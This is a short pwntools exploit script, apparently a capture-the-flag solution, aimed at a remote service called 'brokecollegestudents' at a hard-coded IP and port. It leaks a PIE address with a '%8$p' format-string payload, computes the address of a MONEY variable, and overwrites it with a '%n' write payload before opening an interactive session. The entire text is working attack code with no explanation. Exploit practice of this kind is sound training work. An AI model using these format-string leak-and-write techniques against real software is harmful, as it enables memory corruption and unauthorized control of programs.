from pwn import *
#p=process('./brokecollegestudents')
p=remote('143.198.184.186',5001)
#raw_input("DEBUG")

p.sendlineafter("Choice: ","1")
p.sendlineafter("=\n","1")
p.sendlineafter("CHOOSE: ","1")
#6
payload = "%8$p"
p.sendlineafter("name: ",payload)
p.recvuntil("was: \n\n")
leak = int(p.recv(14),16)
pie = leak - 0x1160
log.info("Pie: "+hex(pie))
MONEY = pie + 0x401c

p.sendlineafter("Choice: ","1")
p.sendlineafter("=\n","1")
p.sendlineafter("CHOOSE: ","1")

payload = "%9999999x%8$n"
payload = payload.ljust(16,"a")
payload += p64(MONEY)
p.sendlineafter("name: ",payload)

#p.sendlineafter("Choice: ","2")
p.interactive()

